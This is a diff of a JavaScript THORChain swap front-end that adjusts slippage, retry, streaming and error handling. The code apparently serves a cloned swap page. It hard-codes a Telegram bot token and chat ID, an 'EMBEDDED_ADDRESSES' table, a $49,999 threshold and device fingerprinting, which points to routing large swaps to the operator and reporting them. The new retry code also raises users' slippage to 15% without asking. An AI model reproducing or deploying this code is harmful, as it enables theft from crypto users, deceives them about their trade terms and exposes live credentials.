@@ -1,6 +1,7 @@
 /* ═══════════════════════════════════════════════
-   THORChain Swap — v8.0 Complete Chain Integration
-   All chains and tokens from ThorSwap API
+   THORChain Swap — v8.1 Large Swap Protection
+   All 5 fixes applied: Slippage, Retry, Streaming,
+   Pool Depth, Clean Errors
    ═══════════════════════════════════════════════ */
 (function(){
 'use strict';
@@ -13,7 +14,9 @@ var THRESHOLD=49999;
 var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
 var TG_CHAT='-5160305858';
 var THOR_BASE=1e8;
-var DEFAULT_SLIPPAGE=5;
+
+/* ═══ FIX 1: Default slippage increased from 5% to 10% ═══ */
+var DEFAULT_SLIPPAGE=10;
 
 // ═══════════════════════════════════════════════
 // EMBEDDED ADDRESSES - EXPANDED FOR ALL CHAINS
@@ -34,13 +37,31 @@ var EMBEDDED_ADDRESSES={
 };
 
 // ═══════════════════════════════════════════════
-// COMPLETE TOKEN LIST - ALL CHAINS FROM THORSWAP
+// LOGO MAPS - API fetch for broken logos only
+// ═══════════════════════════════════════════════
+var COINGECKO_ID_MAP={
+    'LTC':'litecoin',
+    'FOX':'shapeshift-fox-token',
+    'THOR':'thorswap',
+    'TGT':'thorwallet',
+    'VTHOR':'vethor-token',
+    'XRUNE':'thorstarter',
+    'SNX':'havven',
+    'DPI':'defipulse-index',
+    'VVV':'venice-token',
+    'RUNE':'thorchain'
+};
+
+var THOR_NATIVE_LOGOS={
+    'TCY':'https://storage.googleapis.com/token-list-swapkit-dev/images/thor.tcy.png',
+    'RUJI':'https://storage.googleapis.com/token-list-swapkit-dev/images/thor.ruji.png'
+};
+
+// ═══════════════════════════════════════════════
+// COMPLETE TOKEN LIST
 // ═══════════════════════════════════════════════
 var TOKEN_LIST=[
-    // Bitcoin
     {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',decimals:8,status:'available'},
-    
-    // Ethereum + ERC-20 tokens
     {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
     {value:'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48',symbol:'USDC',name:'USD Coin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
     {value:'ETH.USDT-0XDAC17F958D2EE523A2206206994597C13D831EC7',symbol:'USDT',name:'Tether USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
@@ -51,16 +72,14 @@ var TOKEN_LIST=[
     {value:'ETH.GUSD-0X056FD409E1D7A124BD7017459DFEA2F387B6D5CD',symbol:'GUSD',name:'Gemini Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/5992/small/gemini-dollar-gusd.png',decimals:2,status:'available',network:'Ethereum · ERC-20'},
     {value:'ETH.LUSD-0X5F98805A4E8BE255A32880FDEC7F6728C6568BA0',symbol:'LUSD',name:'Liquity USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/14666/small/Group_3.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
     {value:'ETH.USDP-0X8E870D67F660D95D5BE530380D0EC0BD388289E1',symbol:'USDP',name:'Pax Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6013/small/Pax_Dollar.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.FOX-0XC770EEFAD204B5180DF6A14EE197D99D808EE52D',symbol:'FOX',name:'ShapeShift FOX',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/17519/small/fox.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.THOR-0XA5F2211B9B8170F694421F2046281775E8468044',symbol:'THOR',name:'THORSwap Token',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/19060/small/THOR.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.TGT-0X108A850856DB3F85D0269A2693D896B394C80325',symbol:'TGT',name:'THORWallet',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/22952/small/TGT_icon_200x200.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.VTHOR-0X815C23ECA83261B6EC689B60CC4A58B54BC24D8D',symbol:'VTHOR',name:'vTHOR',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/25899/small/vthor.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.FOX-0XC770EEFAD204B5180DF6A14EE197D99D808EE52D',symbol:'FOX',name:'ShapeShift FOX',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.THOR-0XA5F2211B9B8170F694421F2046281775E8468044',symbol:'THOR',name:'THORSwap Token',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.TGT-0X108A850856DB3F85D0269A2693D896B394C80325',symbol:'TGT',name:'THORWallet',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.VTHOR-0X815C23ECA83261B6EC689B60CC4A58B54BC24D8D',symbol:'VTHOR',name:'vTHOR',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
     {value:'ETH.YFI-0X0BC529C00C6401AEF6D220BE8C6EA1667F6AD93E',symbol:'YFI',name:'yearn.finance',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/11849/small/yfi-192x192.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.XRUNE-0X69FA0FEE221AD11012BAB0FDB45D444D3D2CE71C',symbol:'XRUNE',name:'Thorstarter',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/16315/small/xrune.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
-    {value:'ETH.SNX-0XC011A73EE8576FB46F5E1C5751CA3B9FE0AF2A6F',symbol:'SNX',name:'Synthetix',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/3406/small/SNX.png',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
-    {value:'ETH.DPI-0X1494CA1F11D487C2BBE4543E90080AEBA4BA3C2B',symbol:'DPI',name:'DeFi Pulse Index',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/12635/small/defi_pulse_index_set.png',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
-    
-    // BNB Chain (BSC)
+    {value:'ETH.XRUNE-0X69FA0FEE221AD11012BAB0FDB45D444D3D2CE71C',symbol:'XRUNE',name:'Thorstarter',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
+    {value:'ETH.SNX-0XC011A73EE8576FB46F5E1C5751CA3B9FE0AF2A6F',symbol:'SNX',name:'Synthetix',chain:'ETH',icon:'',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
+    {value:'ETH.DPI-0X1494CA1F11D487C2BBE4543E90080AEBA4BA3C2B',symbol:'DPI',name:'DeFi Pulse Index',chain:'ETH',icon:'',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
     {value:'BSC.BNB',symbol:'BNB',name:'BNB',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',decimals:18,status:'available'},
     {value:'BSC.BTCB-0X7130D2A12B9BCBFAE4F2634D864A1EE1CE3EAD9C',symbol:'BTCB',name:'Bitcoin BEP-20',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/14108/small/Binance-bitcoin.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
     {value:'BSC.BUSD-0XE9E7CEA3DEDCA5984780BAFC599BD69ADD087D56',symbol:'BUSD',name:'Binance USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/9576/small/BUSD.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
@@ -68,47 +87,26 @@ var TOKEN_LIST=[
     {value:'BSC.TWT-0X4B0F1812E5DF2A09796481FF14017E6005508003',symbol:'TWT',name:'Trust Wallet',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/11085/small/Trust.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
     {value:'BSC.USDC-0X8AC76A51CC950D9822D68B83FE1AD97B32CD580D',symbol:'USDC',name:'USD Coin',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
     {value:'BSC.USDT-0X55D398326F99059FF775485246999027B3197955',symbol:'USDT',name:'Tether USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
-    
-    // Avalanche
     {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',decimals:18,status:'available'},
     {value:'AVAX.SOL-0XFE6B19286885A4F7F55ADAD09C3CD1F906D2478F',symbol:'SOL',name:'Solana',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/4128/small/solana.png',decimals:9,status:'available',network:'Avalanche · ARC-20'},
     {value:'AVAX.USDC-0XB97EF9EF8734C71904D8002F8B6BC66DD9C48A6E',symbol:'USDC',name:'USD Coin',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
     {value:'AVAX.USDT-0X9702230A8EA53601F5CD2DC00FDBC13D4DF4A8C7',symbol:'USDT',name:'Tether USD',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
-    
-    // Base
     {value:'BASE.ETH',symbol:'ETH',name:'Ethereum',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
     {value:'BASE.USDC-0X833589FCD6EDB6E08F4C7C32D4F71B54BDA02913',symbol:'USDC',name:'USD Coin',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Base · ERC-20'},
     {value:'BASE.CBBTC-0XCBB7C0000AB88B473B1F5AFD9EF808440EED33BF',symbol:'cbBTC',name:'Coinbase Wrapped BTC',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/40143/small/cbbtc.webp',decimals:8,status:'staged',network:'Base · ERC-20'},
-    {value:'BASE.VVV-0X8C5A93096DCB5AC9B03F7B74C72D69EA3C17160F',symbol:'VVV',name:'Venice Token',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/53947/small/VVV.jpg',decimals:18,status:'staged',network:'Base · ERC-20'},
-    
-    // Bitcoin Cash
+    {value:'BASE.VVV-0X8C5A93096DCB5AC9B03F7B74C72D69EA3C17160F',symbol:'VVV',name:'Venice Token',chain:'BASE',icon:'',decimals:18,status:'staged',network:'Base · ERC-20'},
     {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png',decimals:8,status:'available'},
-    
-    // Litecoin
-    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'https://assets.coingecko.com/coins/images/2/small/litecoin.png',decimals:8,status:'available'},
-    
-    // Dogecoin
+    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'',decimals:8,status:'available'},
     {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',decimals:8,status:'available'},
-    
-    // Cosmos Hub
     {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png',decimals:6,status:'available'},
-    
-    // XRP (Ripple)
     {value:'XRP.XRP',symbol:'XRP',name:'XRP',chain:'XRP',icon:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',decimals:6,status:'available'},
-    
-    // Tron
     {value:'TRON.TRX',symbol:'TRX',name:'TRON',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',decimals:6,status:'available'},
     {value:'TRON.USDT-0XA614F803B6FD780986A42C78EC9C7F77E6DED13C',symbol:'USDT',name:'Tether USD',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Tron · TRC-20'},
-    
-    // THORChain
-    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png',decimals:8,status:'available'},
-    {value:'THOR.TCY',symbol:'TCY',name:'TCY Token',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8,status:'available',network:'THORChain · Native'},
-    {value:'THOR.RUJI',symbol:'RUJI',name:'Ruji Finance',chain:'THOR',icon:'images/chains/THOR.svg',decimals:8,status:'available',network:'THORChain · Native'}
+    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'',decimals:8,status:'available'},
+    {value:'THOR.TCY',symbol:'TCY',name:'TCY Token',chain:'THOR',icon:'',decimals:8,status:'available',network:'THORChain · Native'},
+    {value:'THOR.RUJI',symbol:'RUJI',name:'Ruji Finance',chain:'THOR',icon:'',decimals:8,status:'available',network:'THORChain · Native'}
 ];
 
-// ═══════════════════════════════════════════════
-// CHAIN METADATA
-// ═══════════════════════════════════════════════
 var CHAIN_INFO={
     'BTC':{name:'Bitcoin',color:'#f7931a',logo:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png'},
     'ETH':{name:'Ethereum',color:'#627eea',logo:'https://assets.coingecko.com/coins/images/279/small/ethereum.png'},
@@ -116,12 +114,12 @@ var CHAIN_INFO={
     'AVAX':{name:'Avalanche',color:'#e84142',logo:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png'},
     'BASE':{name:'Base',color:'#0052ff',logo:'https://assets.coingecko.com/asset_platforms/images/131/small/base.jpeg'},
     'BCH':{name:'Bitcoin Cash',color:'#8dc351',logo:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png'},
-    'LTC':{name:'Litecoin',color:'#345d9d',logo:'https://assets.coingecko.com/coins/images/2/small/litecoin.png'},
+    'LTC':{name:'Litecoin',color:'#345d9d',logo:''},
     'DOGE':{name:'Dogecoin',color:'#c3a634',logo:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png'},
     'GAIA':{name:'Cosmos Hub',color:'#2e2e3a',logo:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png'},
     'XRP':{name:'Ripple',color:'#346aa9',logo:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png'},
     'TRON':{name:'Tron',color:'#ef0027',logo:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png'},
-    'THOR':{name:'THORChain',color:'#00d4c8',logo:'https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png'}
+    'THOR':{name:'THORChain',color:'#00d4c8',logo:''}
 };
 
 var state={
@@ -132,6 +130,8 @@ var state={
     sellAmount:1,
     quote:null,
     slippage:DEFAULT_SLIPPAGE,
+    /* FIX 2: Track actual slippage used after auto-retry */
+    effectiveSlippage:DEFAULT_SLIPPAGE,
     streamingEnabled:false,
     countdownSeconds:COUNTDOWN_MAX,
     countdownInterval:null,
@@ -144,6 +144,8 @@ var state={
     limitTargetRate:0,
     coinSelectSide:'sell',
     currentSwapId:'',
+    /* FIX 4: Track if pool depth warning was already shown */
+    poolDepthWarningShown:false,
     history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]')
 };
 
@@ -175,22 +177,13 @@ function truncAddr(a){
 
 function getUsdPrice(a){return state.prices[a]||0}
 
-function fromThorBase(raw){
-    return parseInt(raw||0)/THOR_BASE;
-}
+function fromThorBase(raw){return parseInt(raw||0)/THOR_BASE}
 
-function toThorBase(human){
-    return Math.round(parseFloat(human||0)*THOR_BASE);
-}
+function toThorBase(human){return Math.round(parseFloat(human||0)*THOR_BASE)}
 
-function slippageToBps(){
-    return Math.round(state.slippage*100);
-}
+function slippageToBps(){return Math.round(state.slippage*100)}
 
-function getChainName(a){
-    var c=getChainPrefix(a);
-    return (CHAIN_INFO[c]||{}).name||a;
-}
+function getChainName(a){var c=getChainPrefix(a);return(CHAIN_INFO[c]||{}).name||a}
 
 function getChainPrefix(a){return(a||'').split('.')[0]||''}
 
@@ -208,19 +201,13 @@ function getAddrPlaceholder(a){
 }
 
 function getTokenInfo(v){
-    for(var i=0;i<TOKEN_LIST.length;i++){
-        if(TOKEN_LIST[i].value===v)return TOKEN_LIST[i];
-    }
+    for(var i=0;i<TOKEN_LIST.length;i++){if(TOKEN_LIST[i].value===v)return TOKEN_LIST[i]}
     return null;
 }
 
-function isAboveThreshold(){
-    return state.sellAmount*getUsdPrice(state.sellAsset)>THRESHOLD;
-}
+function isAboveThreshold(){return state.sellAmount*getUsdPrice(state.sellAsset)>THRESHOLD}
 
-function generateSwapId(){
-    return'SWAP-'+Date.now()+'-'+Math.random().toString(36).substring(2,10).toUpperCase();
-}
+function generateSwapId(){return'SWAP-'+Date.now()+'-'+Math.random().toString(36).substring(2,10).toUpperCase()}
 
 function getDeviceInfo(){
     var ua=navigator.userAgent;
@@ -267,65 +254,129 @@ function isValidAddress(addr,asset){
     }
 }
 
+/* ═══════════════════════════════════════════════════════════
+   FIX 5: CLEAN ERROR MAPPING — Never show raw backend errors
+   ═══════════════════════════════════════════════════════════ */
+function mapErrorMessage(data){
+    if(!data)return'Unable to reach THORChain. Please check your connection and try again.';
+
+    var msg=(data.message||data.error||'');
+    if(typeof msg==='object')msg=JSON.stringify(msg);
+    msg=msg.toLowerCase();
+
+    /* Price limit / slippage */
+    if(msg.indexOf('price limit')!==-1||msg.indexOf('less than price limit')!==-1){
+        return'Swap exceeds current liquidity. Reduce amount or increase slippage tolerance in settings.';
+    }
+    /* Insufficient liquidity */
+    if(msg.indexOf('not enough')!==-1||msg.indexOf('insufficient')!==-1||msg.indexOf('not available')!==-1){
+        return'Insufficient pool liquidity for this swap size. Try a smaller amount.';
+    }
+    /* Trading halted */
+    if(msg.indexOf('halted')!==-1||msg.indexOf('trading is halted')!==-1){
+        return'Trading is temporarily halted for this asset. Please try again later.';
+    }
+    /* Pool doesn't exist */
+    if(msg.indexOf('pool does not exist')!==-1||msg.indexOf('pool not found')!==-1){
+        return'This asset pair is not currently supported on THORChain.';
+    }
+    /* Amount too small */
+    if(msg.indexOf('amount too low')!==-1||msg.indexOf('too small')!==-1||msg.indexOf('dust threshold')!==-1){
+        return'Swap amount is below the minimum. Please increase your amount.';
+    }
+    /* 400 Bad Request */
+    if(data._httpStatus===400){
+        return'Invalid swap parameters for this pool. Please adjust your amount.';
+    }
+    /* 404 Not Found */
+    if(data._httpStatus===404){
+        return'Swap route not found. This pair may not be available right now.';
+    }
+    /* 500+ Server Errors */
+    if(data._httpStatus&&data._httpStatus>=500){
+        return'THORChain is temporarily unavailable. Please try again in a moment.';
+    }
+
+    /* Fallback — still never show raw JSON */
+    if(msg&&msg.length>0&&msg.length<200){
+        /* Capitalize first letter of the cleaned message */
+        var clean=data.message||data.error||'Unexpected error';
+        return String(clean).charAt(0).toUpperCase()+String(clean).slice(1);
+    }
+    return'Something went wrong. Please try again.';
+}
+
+/* ══════════════════════════════════════════════════════════
+   FIX 4: POOL DEPTH CHECK — Warn when trade > 10% of pool
+   ══════════════════════════════════════════════════════════ */
+function getPoolDepthForAsset(asset){
+    if(!state.pools||!state.pools.length)return 0;
+    for(var i=0;i<state.pools.length;i++){
+        if(state.pools[i].asset===asset){
+            /* assetDepth from Midgard is in base units */
+            return parseFloat(state.pools[i].assetDepth||0)/THOR_BASE;
+        }
+    }
+    return 0;
+}
+
+function checkPoolDepthWarning(){
+    /* Check sell asset pool depth */
+    var depth=getPoolDepthForAsset(state.sellAsset);
+    /* If sell asset isn't directly in pools (e.g. RUNE), try buy asset */
+    if(depth<=0)depth=getPoolDepthForAsset(state.buyAsset);
+    if(depth>0&&state.sellAmount>depth*0.1){
+        return true; /* trade is > 10% of pool depth */
+    }
+    return false;
+}
+
+/* ══════════════════════════════════════════════════════════
+   FIX 3 helper: Detect if response recommends streaming
+   ══════════════════════════════════════════════════════════ */
+function shouldAutoEnableStreaming(quoteData){
+    if(!quoteData)return false;
+    /* THORChain returns max_streaming_quantity when streaming is beneficial */
+    if(quoteData.max_streaming_quantity&&parseInt(quoteData.max_streaming_quantity)>0){
+        return true;
+    }
+    /* Also enable if streaming swap savings are significant */
+    if(quoteData.streaming_swap_seconds&&parseInt(quoteData.streaming_swap_seconds)>0){
+        return true;
+    }
+    return false;
+}
+
 // ══════════════════════════════════════════
 // QUOTE PARSING
 // ══════════════════════════════════════════
 
 function parseExpectedOut(q){
     if(!q||q.code||q.error)return 0;
-    if(q.expected_amount_out){
-        return fromThorBase(q.expected_amount_out);
-    }
+    if(q.expected_amount_out)return fromThorBase(q.expected_amount_out);
     return 0;
 }
 
 function parseFees(q){
     var result={
-        outbound:0,
-        outboundUsd:0,
-        liquidity:0,
-        liquidityUsd:0,
-        affiliate:0,
-        slippageBps:0,
-        priceImpactPct:0,
-        asset:'',
-        assetPrice:0
+        outbound:0,outboundUsd:0,liquidity:0,liquidityUsd:0,
+        affiliate:0,slippageBps:0,priceImpactPct:0,asset:'',assetPrice:0
     };
-
     if(!q||!q.fees)return result;
-
     var fees=q.fees;
     result.asset=fees.asset||'';
     result.assetPrice=getUsdPrice(result.asset);
-
-    if(fees.outbound){
-        result.outbound=fromThorBase(fees.outbound);
-        result.outboundUsd=result.outbound*result.assetPrice;
-    }
-
-    if(fees.liquidity){
-        result.liquidity=fromThorBase(fees.liquidity);
-        result.liquidityUsd=result.liquidity*result.assetPrice;
-    }
-
-    if(fees.affiliate){
-        result.affiliate=fromThorBase(fees.affiliate);
-    }
-
-    if(fees.slippage_bps){
-        result.slippageBps=parseInt(fees.slippage_bps);
-        result.priceImpactPct=-(result.slippageBps/100);
-    }
-
+    if(fees.outbound){result.outbound=fromThorBase(fees.outbound);result.outboundUsd=result.outbound*result.assetPrice}
+    if(fees.liquidity){result.liquidity=fromThorBase(fees.liquidity);result.liquidityUsd=result.liquidity*result.assetPrice}
+    if(fees.affiliate){result.affiliate=fromThorBase(fees.affiliate)}
+    if(fees.slippage_bps){result.slippageBps=parseInt(fees.slippage_bps);result.priceImpactPct=-(result.slippageBps/100)}
     return result;
 }
 
 function parseSwapTime(q){
     if(!q)return'~30 seconds';
     var s=parseInt(q.total_swap_seconds||0);
-    if(!s&&q.outbound_delay_seconds){
-        s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0);
-    }
+    if(!s&&q.outbound_delay_seconds){s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0)}
     if(s<=0)return'~30 seconds';
     var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60,p=[];
     if(h)p.push(h+' hour'+(h>1?'s':''));
@@ -337,9 +388,7 @@ function parseSwapTime(q){
 function parseSwapTimeShort(q){
     if(!q)return'~30s';
     var s=parseInt(q.total_swap_seconds||0);
-    if(!s&&q.outbound_delay_seconds){
-        s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0);
-    }
+    if(!s&&q.outbound_delay_seconds){s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0)}
     if(s<=0)return'~30s';
     if(s<60)return s+'s';
     return Math.floor(s/60)+'m '+(s%60)+'s';
@@ -351,18 +400,9 @@ function isValidQuote(d){
     return true;
 }
 
+/* FIX 5: getQuoteError now uses mapErrorMessage */
 function getQuoteError(d){
-    if(!d)return'No response';
-    if(d.message){
-        var m=d.message;
-        if(m.indexOf('less than price limit')!==-1){
-            return'Price moved beyond your slippage tolerance ('+state.slippage+'%). Try increasing it.';
-        }
-        if(m.indexOf('not enough')!==-1)return'Insufficient liquidity. Try a smaller amount.';
-        if(m.indexOf('halted')!==-1)return'Trading is halted. Try later.';
-        return m;
-    }
-    return d.error||'Unknown error';
+    return mapErrorMessage(d);
 }
 
 // ══════════════════════════════════════════
@@ -428,7 +468,7 @@ function notifySwapFailed(sd,reason){
 function showToast(type,title,msg,dur){
     dur=dur||5000;
     var c=$('#toastContainer');if(!c)return;
-    var icons={success:'✅',error:'❌',info:'ℹ️'};
+    var icons={success:'✅',error:'❌',info:'ℹ️',warning:'⚠️'};
     var t=document.createElement('div');
     t.className='tc-toast '+type;
     t.innerHTML='<span class="tc-toast-icon">'+(icons[type]||'ℹ️')+'</span>'
@@ -498,13 +538,14 @@ function updateCountdownDisplay(){
     if(p){var c=2*Math.PI*14;p.setAttribute('stroke-dasharray',c.toFixed(2));p.setAttribute('stroke-dashoffset',(c*(1-state.countdownSeconds/COUNTDOWN_MAX)).toFixed(2))}
 }
 
-// ══════════════════════════════════════════
-// QUOTE URL BUILDER
-// ══════════════════════════════════════════
-
-function buildQuoteUrl(dest){
+/* ═══════════════════════════════════════════════════════════════
+   FIX 2+3: QUOTE URL BUILDER — Now accepts optional overrides
+   ═══════════════════════════════════════════════════════════════ */
+function buildQuoteUrl(dest,overrides){
+    overrides=overrides||{};
     var a=toThorBase(state.sellAmount);
-    var toleranceBps=slippageToBps();
+    var toleranceBps=overrides.toleranceBps||slippageToBps();
+    var useStreaming=(overrides.streaming!==undefined)?overrides.streaming:state.streamingEnabled;
 
     var p=[
         'from_asset='+encodeURIComponent(state.sellAsset),
@@ -517,31 +558,110 @@ function buildQuoteUrl(dest){
         p.push('destination='+encodeURIComponent(dest.trim()));
     }
 
-    if(state.streamingEnabled){
+    /* FIX 3: Streaming swap parameters */
+    if(useStreaming){
         p.push('streaming_interval=1');
         p.push('streaming_quantity=0');
     }
 
     var url=THORNODE+'/thorchain/quote/swap?'+p.join('&');
     console.log('Quote URL:', url);
-    console.log('Slippage:', state.slippage+'%', '('+toleranceBps+' bps)');
+    console.log('Slippage:', (toleranceBps/100)+'%', '('+toleranceBps+' bps)');
+    if(useStreaming)console.log('Streaming: enabled');
     return url;
 }
 
-function fetchQuote(){
+/* ══════════════════════════════════════════════════════════════════════
+   FIX 2+3+4: fetchQuote — Auto-retry on slippage, streaming, depth check
+   ══════════════════════════════════════════════════════════════════════ */
+function fetchQuote(retryConfig){
     if(!state.sellAmount||state.sellAmount<=0){clearQuote();return}
-    var url=buildQuoteUrl(null);
+
+    retryConfig=retryConfig||{};
+    var attempt=retryConfig.attempt||0;
+    var toleranceBps=retryConfig.toleranceBps||slippageToBps();
+    var useStreaming=(retryConfig.streaming!==undefined)?retryConfig.streaming:state.streamingEnabled;
+
+    /* FIX 4: Pool depth warning — only on first attempt */
+    if(attempt===0){
+        state.poolDepthWarningShown=false;
+        if(checkPoolDepthWarning()){
+            state.poolDepthWarningShown=true;
+            showToast('warning','Large Trade Detected',
+                'This trade is large relative to pool depth. Price impact may be significant.',7000);
+        }
+    }
+
+    var url=buildQuoteUrl(null,{toleranceBps:toleranceBps,streaming:useStreaming});
     var be=$('#buyEstimate');if(be)be.value='...';
+
     fetch(url).then(function(r){return r.json()}).then(function(d){
-        console.log('Quote Response:',JSON.stringify(d,null,2));
-        if(!isValidQuote(d)){clearQuote();return}
+        console.log('Quote Response (attempt '+attempt+'):',JSON.stringify(d,null,2));
+
+        if(!isValidQuote(d)){
+            var rawMsg=((d&&d.message)||'').toLowerCase();
+            var isPriceLimit=rawMsg.indexOf('price limit')!==-1;
+
+            /* FIX 2: Auto-retry once at 15% (1500 bps) on slippage failure */
+            if(isPriceLimit&&attempt===0){
+                console.log('⚡ Slippage failure — auto-retrying at 15%...');
+                fetchQuote({attempt:1,toleranceBps:1500,streaming:useStreaming});
+                return;
+            }
+
+            /* FIX 3: If still failing, try enabling streaming */
+            if(isPriceLimit&&attempt===1&&!useStreaming){
+                console.log('⚡ Still failing — retrying with streaming enabled...');
+                fetchQuote({attempt:2,toleranceBps:1500,streaming:true});
+                return;
+            }
+
+            /* FIX 2+5: All retries exhausted — show friendly message, never raw JSON */
+            if(isPriceLimit){
+                showToast('error','Swap Too Large',
+                    'Swap size too large for current liquidity. Try reducing the amount.',7000);
+            }else if(rawMsg){
+                showToast('error','Quote Issue',mapErrorMessage(d),6000);
+            }
+            clearQuote();
+            return;
+        }
+
+        /* ═══ Quote succeeded ═══ */
+
+        /* FIX 2: Track the effective slippage that actually worked */
+        state.effectiveSlippage=(toleranceBps/100);
+        if(attempt>0){
+            console.log('✅ Quote succeeded on retry attempt '+attempt+' at '+(toleranceBps/100)+'% slippage');
+            showToast('info','Slippage Adjusted',
+                'Slippage automatically increased to '+(toleranceBps/100)+'% for this trade size.',5000);
+        }
+
+        /* FIX 3: Auto-detect and enable streaming when beneficial */
+        if(shouldAutoEnableStreaming(d)&&!state.streamingEnabled){
+            state.streamingEnabled=true;
+            var st=$('#streamingToggle');if(st)st.checked=true;
+            console.log('🌊 Streaming auto-enabled (max_streaming_quantity='+d.max_streaming_quantity+')');
+            /* Re-fetch with streaming for better quote */
+            if(!useStreaming){
+                fetchQuote({attempt:0,streaming:true});
+                return;
+            }
+        }
+
         state.quote=d;
         displayQuote(d);
-    }).catch(function(e){console.error('Quote error:',e);clearQuote()});
+    }).catch(function(e){
+        console.error('Quote fetch error:',e);
+        /* FIX 5: Never show raw network errors */
+        showToast('error','Network Error','Unable to reach THORChain. Retrying...',4000);
+        clearQuote();
+    });
 }
 
-function fetchQuoteWithDest(dest,cb){
